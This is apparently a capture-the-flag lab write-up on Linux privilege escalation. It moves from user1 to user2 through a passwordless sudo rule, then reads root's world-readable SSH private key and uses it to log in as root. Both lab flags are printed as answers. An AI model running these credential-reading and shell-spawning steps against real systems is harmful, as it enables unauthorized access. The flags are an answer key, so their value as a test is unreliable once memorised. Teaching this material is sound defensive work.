# Section 11: Privilege Escalation

**Module:** 02 — Getting Started  
**Topics:** SSH Access, Sudo Enumeration, Lateral Movement, Linux Privilege Escalation, SSH Private Keys  
**Status:** Answers documented

---

## Questions & Answers

### Question 1: Move from `user1` to `user2` and Retrieve the Flag

**Question**

SSH into the server using the provided credentials and specify the supplied port using `-p`. Once logged in, find a way to move to `user2` and retrieve the flag from `/home/user2/flag.txt`.

### Step 1: Connect to the Target Using SSH

**Target Details**

| Parameter | Value |
|---|---|
| IP address | `154.57.164.61` |
| SSH port | `30833` |
| Username | `user1` |
| Password | `password1` |

**Command Used**

```bash
ssh user1@154.57.164.61 -p 30833
```

After accepting the SSH host key, the password was entered to establish the connection.

**Detailed Explanation**

SSH (Secure Shell) provides an encrypted connection to a remote system.

The `-p` option specifies the destination port. Here, SSH was configured to listen on port `30833` rather than its conventional default port `22`.

### Step 2: Enumerate Sudo Permissions

After logging in as `user1`, the following command was executed:

```bash
sudo -l
```

**Observed Output**

```text
User user1 may run the following commands:

(user2 : user2) NOPASSWD: /bin/bash
```

**Detailed Explanation**

The `sudo -l` command displays the commands that the current user is permitted to execute through `sudo`.

The output reveals that:

- `user1` is allowed to execute `/bin/bash` as `user2`.
- `NOPASSWD` means that this specific permitted command does not require the user's password.
- The command can be executed with the privileges of the specified target user.

This is an important privilege-escalation discovery because the sudo rule allows `user1` to start a shell as another account.

### Step 3: Switch to `user2`

**Command Used**

```bash
sudo -u user2 /bin/bash
```

**Command Explanation**

| Component | Purpose |
|---|---|
| `sudo` | Executes a command with another user's privileges. |
| `-u user2` | Specifies `user2` as the target account. |
| `/bin/bash` | Starts a Bash shell. |

The shell prompt changed to:

```text
user2@ng-2162140-gettingstartedprivesc-9byao-85bc4dccd-4bxmz:/home/user1$
```

This confirmed that the shell was now running as `user2`.

### Step 4: Retrieve the `user2` Flag

**Command Used**

```bash
cat /home/user2/flag.txt
```

**Observed Output**

```text
HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}
```

**Detailed Explanation**

The first stage demonstrated lateral movement between local user accounts.

Rather than exploiting a software vulnerability, the transition was possible because of an existing sudo permission granted to `user1`.

**Short Answer**

```text
HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}
```

---

### Question 2: Escalate from `user2` to Root

**Question**

Once you gain access to `user2`, find a way to escalate your privileges to root and retrieve the flag from `/root/flag.txt`.

### Step 1: Inspect the Filesystem

After becoming `user2`, the root filesystem was inspected:

```bash
ls -la /
```

The output showed the available directories and their permissions.

The `/root` directory was listed with:

```text
drwxr-x---. 1 root user2 18 Feb 12 2021 root
```

**Detailed Explanation**

Linux permissions determine which users can read, write, or execute files and directories.

The `/root` directory is owned by `root`, but its group is `user2`.

The permission string `drwxr-x---` indicates:

- Owner (`root`): read, write, and execute.
- Group (`user2`): read and execute.
- Others: no permissions.

Because `user2` belongs to the directory's group, the account can access its contents.

### Step 2: Inspect the Root SSH Directory

The following command was used:

```bash
ls -la /root/.ssh
```

**Observed Output**

```text
-rw-------. 1 root root  571 Feb 12 2021 authorized_keys
-rw-r--r--. 1 root root 2602 Feb 12 2021 id_rsa
-rw-r--r--. 1 root root  571 Feb 12 2021 id_rsa.pub
```

**Detailed Explanation**

The `.ssh` directory contained three relevant files:

| File | Purpose |
|---|---|
| `authorized_keys` | Contains public keys authorized to authenticate to the account. |
| `id_rsa` | An SSH private key. |
| `id_rsa.pub` | The corresponding SSH public key. |

The presence of an SSH private key in the root account's directory was an important discovery.

The observed permissions on `id_rsa` were `-rw-r--r--`, meaning that the file was readable by users other than its owner. This exposes the private key to unauthorized local users.

Private SSH keys should be protected and should not be readable by other users.

### Step 3: Read the SSH Private Key

The key was inspected using:

```bash
cat /root/.ssh/id_rsa
```

The supplied output showed an OpenSSH private-key file.

The private-key contents are intentionally omitted from this write-up.

**Security Explanation**

An SSH private key can authenticate a user when the corresponding public key is trusted by the remote account.

If an unauthorized user can read another account's private key, that user may be able to authenticate as the account associated with the key.

### Step 4: Connect as Root Using the Discovered Key

The private key was copied to the attacking machine as `id_rsa` and used with SSH.

**Command Used**

```bash
ssh root@154.57.164.61 -p 30833 -i id_rsa
```

**Command Explanation**

| Option | Purpose |
|---|---|
| `root@154.57.164.61` | Connects to the target as root. |
| `-p 30833` | Specifies the SSH port. |
| `-i id_rsa` | Specifies the private key used for authentication. |

The connection succeeded, and the shell prompt changed to a root shell.

### Step 5: Retrieve the Root Flag

**Command Used**

```bash
cat /root/flag.txt
```

**Observed Output**

```text
HTB{pr1v1l363_35c4l4710n_2_r007}
```

**Detailed Explanation**

The second stage demonstrated a privilege escalation caused by insecure private-key permissions.

The sequence was:

1. Inspect filesystem permissions.
2. Discover that `user2` could access `/root`.
3. Inspect the root SSH directory.
4. Identify a readable private SSH key.
5. Use the key to authenticate as root.
6. Read the root flag.

**Short Answer**

```text
HTB{pr1v1l363_35c4l4710n_2_r007}
```

---

## Key Takeaways

- **SSH:** Use `-p` when connecting to a service running on a non-default SSH port.
- **Sudo enumeration:** `sudo -l` identifies commands that the current account is authorized to execute.
- **Lateral movement:** A permitted sudo rule can allow movement from one local account to another.
- **Linux permissions:** Understand owner, group, and other permission bits when examining sensitive directories.
- **SSH authentication:** Private keys can authenticate users when their corresponding public keys are trusted.
- **Private-key security:** SSH private keys must not be readable by unauthorized users.
- **Privilege escalation:** Misconfigured permissions can expose credentials or keys that allow access to a more privileged account.

---

## Security Lessons

The two privilege transitions resulted from different misconfigurations:

| Stage | Finding | Result |
|---|---|---|
| `user1` → `user2` | Passwordless sudo permission for `/bin/bash` | Access to `user2` |
| `user2` → `root` | Root SSH private key readable by `user2` | Root authentication |

These findings demonstrate why sudo policies, filesystem permissions, and SSH private-key storage should be reviewed during Linux security assessments.

---

[Back to Module Index](./README.md)
